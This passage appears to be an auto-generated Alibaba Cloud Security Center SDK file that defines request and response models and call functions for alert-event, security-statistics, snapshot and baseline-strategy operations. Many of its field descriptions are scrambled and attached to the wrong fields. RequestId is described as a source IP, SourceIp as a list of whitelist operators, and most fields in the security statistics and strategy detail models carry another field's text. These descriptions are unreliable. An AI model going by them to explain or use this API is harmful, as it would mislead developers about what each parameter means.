  taskId?: long(name='TaskId', description='The information about the task that handles the alert events.', example='12121'),
}

model DescribeSecurityEventOperationStatusResponseBody = {
  requestId?: string(name='RequestId', description='The source IP address of the request.', example='1683940A-E4AE-4473-8C40-F4075434B76B'),
  securityEventOperationStatusResponse?: {
    securityEventOperationStatuses?: [ 
      {
        errorCode?: string(name='ErrorCode', example='ignore.Success'),
        securityEventId?: string(name='SecurityEventId', example='12321'),
        status?: string(name='Status', example='Success'),
      }
    ](name='SecurityEventOperationStatuses', description='DescribeSecurityEventOperationStatus'),
    taskStatus?: string(name='TaskStatus', description='Queries the alert events that are triggered by the same IP address rule or of the same alert type as a specific alert event if you want to handle the specific alert event in batch operation mode.', example='Success'),
  }(name='SecurityEventOperationStatusResponse', description='192.168.XX.XX'),
}

model DescribeSecurityEventOperationStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationStatusResponseBody(name='body'),
}

async function describeSecurityEventOperationStatusWithOptions(request: DescribeSecurityEventOperationStatusRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperationStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityEventOperationStatus(request: DescribeSecurityEventOperationStatusRequest): DescribeSecurityEventOperationStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationStatusWithOptions(request, runtime);
}

model DescribeSecurityEventOperationsRequest {
  lang?: string(name='Lang', description='The value of the field that can be used in the whitelist rule.', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The field that can be used in the whitelist rule.', example='61352054'),
  sourceIp?: string(name='SourceIp', description='The operation that is supported in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal', example='192.168.XX.XX'),
}

model DescribeSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', description='The configuration of the operation that you can perform to handle the alert event.

>  If the value of the OperationCode parameter is `kill_and_quara` or `block_ip`, the OperationParams parameter is required. If the value of the OperationCode parameter is a different value, the OperationParams parameter can be left empty.', example='B7A2000F-497E-5DA0-B14D-615CD410DD7E'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='61352054', example='file path'),
          filedName?: string(name='FiledName', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='gmtModified'),
          markMisType?: string(name='MarkMisType', description='An array consisting of the operations that you can perform to handle the alert event.', example='contains'),
          markMisValue?: string(name='MarkMisValue', description='An array consisting of the configuration information that is used when the value of the OperationCode parameter is **advance_mark_mis_info**.', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
          uuid?: string(name='Uuid', description='The alias of the field that can be used in the whitelist rule.', example='3d6b4a75-c28f-447b-9142-38f6252c****'),
        }
      ](name='MarkField', description='The source IP address of the request.'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='DescribeSecurityEventOperations', example='file path'),
          filedName?: string(name='FiledName', description='Queries the operations that you can perform to handle an alert event.', example='gmtModified'),
          markMisValue?: string(name='MarkMisValue', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkFieldsSource', description='192.168.XX.XX'),
      operationCode?: string(name='OperationCode', description='The operation that you can perform to handle the alert. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance_mark_mis_info**: adds the alert to the whitelist.
*   **ignore**: ignores the alert.
*   **manual_handled**: marks the alert as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill_and_quara**: terminates the malicious process and quarantines the source file.
*   **disable_malicious_defense**: stops the container on which the alerting files or processes exist.
*   **client_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', description='Indicates whether you can handle the alert event in the current edition of Security Center. Valid values:

*   **true**: yes
*   **false**: no', example='{"expireTime":1641566807783}'),
      userCanOperate?: boolean(name='UserCanOperate', description='The UUID of the server on which the alert event is detected.', example='false'),
    }
  ](name='SecurityEventOperationsResponse', description='The operation that is used and can be modified in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal'),
}

model DescribeSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationsResponseBody(name='body'),
}

async function describeSecurityEventOperationsWithOptions(request: DescribeSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityEventOperations(request: DescribeSecurityEventOperationsRequest): DescribeSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationsWithOptions(request, runtime);
}

model DescribeSecurityStatInfoRequest {
  lang?: string(name='Lang', description='The numbers of low-risk unfixed vulnerabilities at all points in time.', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The number of **high-risk** unfixed vulnerabilities at each point in time.', example='12345'),
  sourceIp?: string(name='SourceIp', description='The total number of baseline risk items on the current day.', example='1.2.XX.XX'),
}

model DescribeSecurityStatInfoResponseBody = {
  attackEvent?: {
    dateArray?: [ string ](name='DateArray', description='The total number of baseline risk items at all points in time.'),
    totalCount?: int32(name='TotalCount', description='The time periods during which data of the same alert is collected.', example='1096'),
    valueArray?: [ string ](name='ValueArray', description='The number of **medium-risk** unfixed vulnerabilities on the current day.'),
  }(name='AttackEvent', description='The numbers of baseline risk items that have the high-risk level at all points in time.'),
  healthCheck?: {
    dateArray?: [ string ](name='DateArray', description='The number of **medium-risk** unfixed vulnerabilities at each point in time.'),
    highCount?: int32(name='HighCount', description='The risk level of the unhandled alert. Valid values:

*   **remind**
*   **suspicious**
*   **serious**', example='10'),
    highList?: [ string ](name='HighList', description='The point in time when data of unfixed vulnerabilities is collected in the trend chart.'),
    levelsOn?: [ string ](name='LevelsOn', description='The time periods during which data of baseline risk items is collected.'),
    lowCount?: int32(name='LowCount', description='The total number of unhandled alerts on the current day.', example='0'),
    lowList?: [ string ](name='LowList', description='The numbers of suspicious alerts at all points in time.'),
    mediumCount?: int32(name='MediumCount', description='The numbers of attacks at all points in time.', example='21'),
    mediumList?: [ string ](name='MediumList', description='The number of baseline risk items that have the high-risk level on the current day.'),
    timeArray?: [ string ](name='TimeArray', description='The risk level of the unfixed vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **Nntf**: low'),
    totalCount?: int32(name='TotalCount', description='The detailed statistics of attacks.', example='32'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of baseline risk items that have the low-risk level at all points in time.'),
  }(name='HealthCheck', description='The number of **serious** alerts at each point in time.'),
  requestId?: string(name='RequestId', description='The points in time when data of unfixed vulnerabilities is collected in the trend chart.', example='A3E61730-85E2-4789-8017-B9B1B70F0568'),
  securityEvent?: {
    dateArray?: [ string ](name='DateArray', description='The numbers of high-risk unfixed vulnerabilities at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The point in time when the number of attacks is collected in the trend chart.'),
    remindCount?: int32(name='RemindCount', description='The points in time when data of unhandled alerts is collected in the trend chart.', example='0'),
    remindList?: [ string ](name='RemindList', description='The numbers of unhandled alerts at all points in time.'),
    seriousCount?: int32(name='SeriousCount', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='404'),
    seriousList?: [ string ](name='SeriousList', description='The number of **low-risk** unfixed vulnerabilities on the current day.'),
    suspiciousCount?: int32(name='SuspiciousCount', description='The number of baseline risk items that have the high-risk level at each point in time.', example='148'),
    suspiciousList?: [ string ](name='SuspiciousList', description='The number of **remind** alerts on the current day.'),
    timeArray?: [ string ](name='TimeArray', description='The numbers of medium-risk unfixed vulnerabilities at all points in time.'),
    totalCount?: int32(name='TotalCount', description='The number of baseline risk items that have the low-risk level on the current day.', example='552'),
    valueArray?: [ string ](name='ValueArray', description='The total number of unfixed vulnerabilities on the current day.'),
  }(name='SecurityEvent', description='The risk levels of baseline risk items.'),
  success?: boolean(name='Success', description='The number of baseline risk items that have the medium-risk level at each point in time.', example='true'),
  vulnerability?: {
    asapCount?: int32(name='AsapCount', description='The points in time when the number of attacks is collected in the trend chart.', example='109'),
    asapList?: [ string ](name='AsapList', description='The risk levels of unhandled alerts.'),
    dateArray?: [ string ](name='DateArray'),
    laterCount?: int32(name='LaterCount', description='The number of **suspicious** alerts on the current day.', example='275'),
    laterList?: [ string ](name='LaterList'),
    levelsOn?: [ string ](name='LevelsOn'),
    nntfCount?: int32(name='NntfCount', description='The points in time when data of baseline risk items is collected in the trend chart.', example='0'),
    nntfList?: [ string ](name='NntfList', description='The time periods during which data of unfixed vulnerabilities is collected.'),
    timeArray?: [ string ](name='TimeArray', description='Queries the statistics of each security check item and the daily statistics in the trend chart based on each security check item.'),
    totalCount?: int32(name='TotalCount', description='The numbers of remind alerts at all points in time.', example='384'),
    valueArray?: [ string ](name='ValueArray', description='The ID of the request, which is used to locate and troubleshoot issues.'),
  }(name='Vulnerability', description='The number of baseline risk items that have the low-risk level at each point in time.'),
}

model DescribeSecurityStatInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityStatInfoResponseBody(name='body'),
}

async function describeSecurityStatInfoWithOptions(request: DescribeSecurityStatInfoRequest, runtime: Util.RuntimeOptions): DescribeSecurityStatInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityStatInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSecurityStatInfo(request: DescribeSecurityStatInfoRequest): DescribeSecurityStatInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityStatInfoWithOptions(request, runtime);
}

model DescribeServiceLinkedRoleStatusRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas'),
}

model DescribeServiceLinkedRoleStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39CE98F4-88C0-4539-B906-6B542E5C07B9'),
  roleStatus?: {
    status?: boolean(name='Status', description='Indicates whether the service-linked role is created. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  }(name='RoleStatus', description='The status information about the service-linked role.'),
}

model DescribeServiceLinkedRoleStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeServiceLinkedRoleStatusResponseBody(name='body'),
}

async function describeServiceLinkedRoleStatusWithOptions(request: DescribeServiceLinkedRoleStatusRequest, runtime: Util.RuntimeOptions): DescribeServiceLinkedRoleStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeServiceLinkedRoleStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeServiceLinkedRoleStatus(request: DescribeServiceLinkedRoleStatusRequest): DescribeServiceLinkedRoleStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeServiceLinkedRoleStatusWithOptions(request, runtime);
}

model DescribeSimilarEventScenariosRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', example='12321'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX'),
}

model DescribeSimilarEventScenariosResponseBody = {
  requestId?: string(name='RequestId', example='FDF7B8D9-8493-4B90-8D13-E0C1FFCE5F97'),
  scenarios?: [ 
    {
      code?: string(name='Code', example='same_url'),
    }
  ](name='Scenarios'),
}

model DescribeSimilarEventScenariosResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarEventScenariosResponseBody(name='body'),
}

async function describeSimilarEventScenariosWithOptions(request: DescribeSimilarEventScenariosRequest, runtime: Util.RuntimeOptions): DescribeSimilarEventScenariosResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarEventScenarios',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSimilarEventScenarios(request: DescribeSimilarEventScenariosRequest): DescribeSimilarEventScenariosResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarEventScenariosWithOptions(request, runtime);
}

model DescribeSimilarSecurityEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  taskId?: long(name='TaskId', description='The ID of the task. You can call the [CreateSimilarSecurityEventsQueryTask](~~CreateSimilarSecurityEventsQueryTask~~) operation to query the IDs of tasks.', example='1689135'),
}

model DescribeSimilarSecurityEventsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4217C8-763F-51EF-84D4-5535E072B2D8'),
  securityEventsResponse?: [ 
    {
      eventName?: string(name='EventName', description='The name of the alert event.', example='Trojan'),
      eventType?: string(name='EventType', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception

For more information about alert types, see [Alerts](https://www.alibabacloud.com/help/en/security-center/latest/events-overview).', example='Malicious Software'),
      lastTime?: long(name='LastTime', description='The timestamp when the alert event was last detected. Unit: milliseconds.', example='1648544361480'),
      occurrenceTime?: long(name='OccurrenceTime', description='The timestamp when the alert event was first detected. Unit: milliseconds.', example='1648457961000'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.', example='158661'),
      uuid?: string(name='Uuid', description='The UUID of the server that is affected by the alert event.', example='qweeqq-13232-daweq-w****'),
    }
  ](name='SecurityEventsResponse', description='An array consisting of the alert events that are triggered by the same rule or of the same alert type.'),
}

model DescribeSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarSecurityEventsResponseBody(name='body'),
}

async function describeSimilarSecurityEventsWithOptions(request: DescribeSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): DescribeSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSimilarSecurityEvents(request: DescribeSimilarSecurityEventsRequest): DescribeSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarSecurityEventsWithOptions(request, runtime);
}

model DescribeSnapshotsRequest {
  apiVersion?: string(name='ApiVersion', example='2.0.0'),
  currentPage?: int32(name='CurrentPage', example='1'),
  isAliYunEcs?: string(name='IsAliYunEcs', example='true'),
  machineRegion?: string(name='MachineRegion', example='us-east-1'),
  machineRemark?: string(name='MachineRemark', example='192.168.XX.XX'),
  nextToken?: string(name='NextToken', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAB4SwmEAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM0NzY3YTZjNjI3NjZmNmU3MjcxNjk3NDY5MzY3MjY4****'),
  pageSize?: int32(name='PageSize', example='20'),
  statusList?: string(name='StatusList', example='["COMPLETE"]'),
  uuid?: string(name='Uuid', example='061d8042-59ff-416e-bc33-294a1cf5****'),
}

model DescribeSnapshotsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    nextToken?: string(name='NextToken', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4****'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='149'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
  snapshots?: [ 
    {
      actualBytes?: long(name='ActualBytes', example='686188****'),
      actualItems?: long(name='ActualItems', example='123'),
      bytesDone?: long(name='BytesDone', example='800'),
      bytesTotal?: long(name='BytesTotal', example='3484541815****'),
      clientId?: string(name='ClientId', example='c-000dbefaw9f7gnbw****'),
      clientVersion?: string(name='ClientVersion', example='2.10.0'),
      createdTime?: long(name='CreatedTime', example='1646793988'),
      errorFile?: string(name='ErrorFile', example='s-0008ndhgrflh55i5****.csv'),
      instanceId?: string(name='InstanceId', example='i-2ze78zfakirgh1yl****'),
      itemsDone?: long(name='ItemsDone', example='6'),
      itemsTotal?: long(name='ItemsTotal', example='7'),
      jobId?: string(name='JobId', example='job-000a2q5vg6awgo01****'),
      parentSnapshotHash?: string(name='ParentSnapshotHash', example='a0181606689c9562f092b3190bddb8a62bb5a24784424ba2102bc7fe92ae****'),
      path?: string(name='Path', example='["/home"]'),
      paths?: [ string ](name='Paths'),
      planId?: string(name='PlanId', example='plan-000ee8gh2ljelsnb****'),
      regionId?: string(name='RegionId', example='us-east-1'),
      retention?: long(name='Retention', example='7'),
      snapshotHash?: string(name='SnapshotHash', example='9ee47cf12351e4ddecce8c12f4957d3946cd96fbe24cd4ab264c7200839d****'),
      snapshotId?: string(name='SnapshotId', example='s-0003ahfuqpjdztsg****'),
      sourceType?: string(name='SourceType', example='ECS_FILE'),
      status?: string(name='Status', example='COMPLETE'),
      uuid?: string(name='Uuid', example='d332af48-1269-4a55-a6db-8543a80f****'),
      vaultId?: string(name='VaultId', example='v-000ccok3zmw7fbzz****'),
    }
  ](name='Snapshots'),
}

model DescribeSnapshotsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSnapshotsResponseBody(name='body'),
}

async function describeSnapshotsWithOptions(request: DescribeSnapshotsRequest, runtime: Util.RuntimeOptions): DescribeSnapshotsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.apiVersion)) {
    query['ApiVersion'] = request.apiVersion;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isAliYunEcs)) {
    query['IsAliYunEcs'] = request.isAliYunEcs;
  }
  if (!Util.isUnset(request.machineRegion)) {
    query['MachineRegion'] = request.machineRegion;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.nextToken)) {
    query['NextToken'] = request.nextToken;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSnapshots',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSnapshots(request: DescribeSnapshotsRequest): DescribeSnapshotsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSnapshotsWithOptions(request, runtime);
}

model DescribeStrategyRequest {
  customType?: string(name='CustomType', example='custom'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='1.2.X.X'),
  strategyIds?: string(name='StrategyIds', example='8164248'),
}

model DescribeStrategyResponseBody = {
  requestId?: string(name='RequestId', example='75C127E6-76CD-59A7-B6E4-1CBBDC98F2EB'),
  strategies?: [ 
    {
      configTargets?: [ 
        {
          flag?: string(name='Flag', example='add'),
          target?: string(name='Target', example='10099713'),
          targetType?: string(name='TargetType', example='groupId'),
        }
      ](name='ConfigTargets'),
      customType?: string(name='CustomType', example='custom'),
      cycleDays?: int32(name='CycleDays', example='1'),
      cycleStartTime?: int32(name='CycleStartTime', example='0'),
      ecsCount?: int32(name='EcsCount', example='50'),
      endTime?: string(name='EndTime', example='03:00:00'),
      execStatus?: int32(name='ExecStatus', example='1'),
      id?: int32(name='Id', example='8164248'),
      name?: string(name='Name', example='text2'),
      passRate?: int32(name='PassRate', example='0'),
      processRate?: int32(name='ProcessRate', example='20'),
      riskCount?: int32(name='RiskCount', example='23'),
      startTime?: string(name='StartTime', example='00:00:00'),
      type?: int32(name='Type', example='2'),
    }
  ](name='Strategies'),
}

model DescribeStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyResponseBody(name='body'),
}

async function describeStrategyWithOptions(request: DescribeStrategyRequest, runtime: Util.RuntimeOptions): DescribeStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategy(request: DescribeStrategyRequest): DescribeStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyWithOptions(request, runtime);
}

model DescribeStrategyDetailRequest {
  id?: string(name='Id', description='The alias of the check item.', example='123456'),
  lang?: string(name='Lang', description='The default value of the rule.', example='zh'),
  sourceIp?: string(name='SourceIp', description='The minimum value of the rule parameter.', example='192.168.XX.XX'),
}

model DescribeStrategyDetailResponseBody = {
  requestId?: string(name='RequestId', description='An array that consists of the whitelist of risk items.', example='C5B28F65-9245-5DC1-B3CF-5F2756A756A8'),
  strategy?: {
    customType?: string(name='CustomType', example='common'),
    cycleDays?: int32(name='CycleDays', description='The alias of the sub-check item.', example='3'),
    cycleStartTime?: int32(name='CycleStartTime', description='The details of the rule.', example='0'),
    endTime?: string(name='EndTime', example='03:00:00'),
    id?: int32(name='Id', description='The time period during which the check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='123'),
    name?: string(name='Name', description='The ID of the rule.', example='TestStrategy'),
    riskSubTypeName?: string(name='RiskSubTypeName', example='hc_nginx_linux,tomcat7,hc_mysql_ali,hc_docker'),
    riskTypeWhiteListQueryResultList?: [ 
      {
        alias?: string(name='Alias', description='The condition by which the baseline check policy is applied to the asset. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='Unauthorized Access'),
        on?: boolean(name='On', description='The ID of the check item.', example='false'),
        subTypes?: [ 
          {
            alias?: string(name='Alias', description='The type of the baseline check policy. Valid values:

*   **common**: standard baseline check policy
*   **custom**: custom baseline check policy', example='Redis unauthorized access high exploit vulnerability risk'),
            checkDetails?: [ 
              {
                checkDesc?: string(name='CheckDesc', description='The name of the baseline check policy.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
                checkId?: long(name='CheckId', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='206'),
                checkItem?: string(name='CheckItem', description='The maximum value of the rule parameter.', example='Ensure password expiration period is set.'),
                rules?: [ 
                  {
                    defaultValue?: int32(name='DefaultValue', description='The description of the check item.', example='2'),
                    optional?: int32(name='Optional', description='Indicates whether the sub-risk item is selected. Valid values:

*   **true**: yes
*   **false**: no', example='1'),
                    paramList?: [ 
                      {
                        enumValue?: string(name='EnumValue', example='0,1,2,3'),
                        maxValue?: int32(name='MaxValue', description='Queries the details of a baseline check policy.', example='999'),
                        minValue?: int32(name='MinValue', example='1'),
                        paramDefaultValue?: string(name='ParamDefaultValue', description='Indicates whether the rule is included in the policy. Valid values:

*   **1**: yes
*   **0**: no', example='7'),
                        paramDesc?: string(name='ParamDesc', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                        paramName?: string(name='ParamName', description='The time when the baseline check based on the baseline check policy ends.', example='range_val'),
